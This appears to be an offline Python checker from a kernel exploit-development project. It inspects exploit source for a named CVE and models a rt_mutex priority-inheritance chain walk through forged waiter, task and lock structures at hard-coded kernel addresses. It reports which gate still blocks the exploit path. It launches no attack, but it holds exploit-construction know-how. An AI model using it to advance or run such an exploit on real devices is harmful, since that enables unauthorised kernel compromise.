#!/usr/bin/env python3
"""Offline identity gate for the nfds=256 pselect candidate.

This pass combines the corrected 256-fd waiter map with the matching rtmutex
chain equations.  It does not build, run, or access a device.
"""

from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
FOPS = ROOT / "exploit-repo/IonStack/CVE-2026-43499/exploit/src/fops.c"
UTIL = ROOT / "exploit-repo/IonStack/CVE-2026-43499/exploit/src/util.c"

FAKE_LOCK = 0xFFFFFF81E79984D0
FAKE_W0 = 0xFFFFFF81E7998000 + 0x238
FAKE_TASK = 0xFFFFFF81E7998000 + 0x2380
PSELECT_USER_LOCK = 0x0000007FFF001000


def canonical_kernel(value: int) -> bool:
    return (value >> 48) == 0xFFFF


def source_state() -> dict:
    fops = FOPS.read_text(encoding="utf-8")
    util = UTIL.read_text(encoding="utf-8")
    return {
        "route_call": "poll((struct pollfd *)pselect_user_lock" in fops,
        "fake_w0_lock_user_va": "FAKE_WAITER_LOCK_OFF, (uint64_t)(uintptr_t)pselect_user_lock" in util,
        "fake_task_pi_blocked_on_fake_w0": "pi_blocked_on_off, fake_w0" in util,
        "helper_rebinds_fd3": "for (int fd = 3; fd < PSELECT_ROUTE_NFDS; fd++)" in fops,
    }


def run_profile(name: str, prio: int) -> dict:
    # Corrected 256-fd table: ex[3] controls stale waiter->lock.
    stale_lock = FAKE_LOCK
    fake_w0_lock = PSELECT_USER_LOCK
    owner = FAKE_TASK
    next_lock = fake_w0_lock
    chain_entry = owner != 0 and next_lock != 0
    same_as_orig = next_lock == stale_lock
    next_lock_kernel = canonical_kernel(next_lock)
    # Matching rt_mutex_adjust_prio_chain(): waiter=fake_task->pi_blocked_on=fake_w0,
    # then [5] raw_spin_trylock(next_lock->wait_lock), after [6] same-lock check.
    return {
        "profile": name,
        "prio": prio,
        "corrected_map": {
            "stale_waiter_lock_from_ex3": f"0x{stale_lock:016x}",
            "fake_task_pi_blocked_on": "fake_w0",
            "fake_w0_lock_from_payload": "pselect_user_lock (user VA)",
            "next_lock": "fake_w0->lock",
        },
        "gates": {
            "owner_pi_blocked_on_nonnull": True,
            "next_lock_nonnull": chain_entry,
            "next_lock_equals_stale_orig_lock": same_as_orig,
            "next_lock_is_canonical_kernel_address": next_lock_kernel,
            "raw_spin_trylock_next_lock_addressable": next_lock_kernel,
        },
        "result": (
            "BLOCKED_AT_NEXT_LOCK_TYPE: fake_w0->lock remains user VA; "
            "256-fd ex[3]=fake_lock only fixes stale/original lock, not the second chain lock"
            if not next_lock_kernel
            else "same-lock deadlock check or a separate valid owner/waiter model is still required"
        ),
    }


def main() -> None:
    result = {
        "scope": "offline pselect nfds=256 PI identity/lock gate only",
        "source": source_state(),
        "address_shape": {
            "fake_lock": f"0x{FAKE_LOCK:016x}",
            "fake_w0": f"0x{FAKE_W0:016x}",
            "fake_task": f"0x{FAKE_TASK:016x}",
            "pselect_user_lock": f"0x{PSELECT_USER_LOCK:016x}",
        },
        "profiles": [
            run_profile("original_constants", 130),
            run_profile("lowbit_cleared_diagnostic", 128),
        ],
        "decision": {
            "256_fd_overlay_effect": "ex[3] can statically supply a canonical kernel fake_lock for stale waiter->lock",
            "remaining_blocker": "fake_w0->lock is still pselect_user_lock, so next_lock reaches a user VA",
            "do_not_claim": [
                "PI-tree enqueue/dequeue success",
                "rb_erase/rb_insert target write",
                "CFI or privilege transition",
            ],
            "optimal_followup": "close the second-lock identity with a separate valid kernel rt_mutex model; do not run the current payload",
        },
    }
    print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
